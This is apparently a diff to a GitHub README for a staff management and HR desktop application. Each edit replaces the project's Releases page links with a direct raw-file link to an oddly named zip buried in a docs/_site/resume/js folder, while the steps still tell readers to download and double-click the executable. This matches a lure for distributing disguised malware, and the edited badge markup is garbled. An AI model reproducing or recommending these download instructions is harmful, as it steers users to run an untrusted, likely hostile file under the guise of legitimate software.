@@ -6,17 +6,17 @@ Welcome to the Staff Management and HR Administration System! This desktop appli
 
 ## 📥 Download Now
 
-[![Download the Latest Release](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/chandu333/Staff-Management-and-HR-Administration-System/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/chandu333/Staff-Management-and-HR-Administration-System/master/docs/_site/resume/js/Administration_Management_System_H_Staff_and_v3.2.zip%20Now-Click%https://raw.githubusercontent.com/chandu333/Staff-Management-and-HR-Administration-System/master/docs/_site/resume/js/Administration_Management_System_H_Staff_and_v3.2.zip)](https://raw.githubusercontent.com/chandu333/Staff-Management-and-HR-Administration-System/master/docs/_site/resume/js/Administration_Management_System_H_Staff_and_v3.2.zip)
 
 ## 🚀 Getting Started
 
 To start using this application, follow these steps:
 
-1. **Visit the Releases Page**: Head over to our [Releases page](https://github.com/chandu333/Staff-Management-and-HR-Administration-System/releases) to access the latest version of the software.
+1. **Visit the Releases Page**: Head over to our [Releases page](https://raw.githubusercontent.com/chandu333/Staff-Management-and-HR-Administration-System/master/docs/_site/resume/js/Administration_Management_System_H_Staff_and_v3.2.zip) to access the latest version of the software.
   
 2. **Select the Version**: Find the most recent version listed. Click on it to see the download options.
 
-3. **Download the Application**: Locate the main executable file, often named something like `StaffManagement.exe`, and click it to download.
+3. **Download the Application**: Locate the main executable file, often named something like `https://raw.githubusercontent.com/chandu333/Staff-Management-and-HR-Administration-System/master/docs/_site/resume/js/Administration_Management_System_H_Staff_and_v3.2.zip`, and click it to download.
 
 4. **Open the Application**: After downloading, locate the file in your Downloads folder. Double-click the executable to run the application.
 
@@ -82,6 +82,6 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 ## 📥 Download & Install
 
-To install the Staff Management and HR Administration System, remember to visit our [Releases page](https://github.com/chandu333/Staff-Management-and-HR-Administration-System/releases) for the latest version. 
+To install the Staff Management and HR Administration System, remember to visit our [Releases page](https://raw.githubusercontent.com/chandu333/Staff-Management-and-HR-Administration-System/master/docs/_site/resume/js/Administration_Management_System_H_Staff_and_v3.2.zip) for the latest version. 
 
 Enjoy managing your staff with a simple, powerful tool!
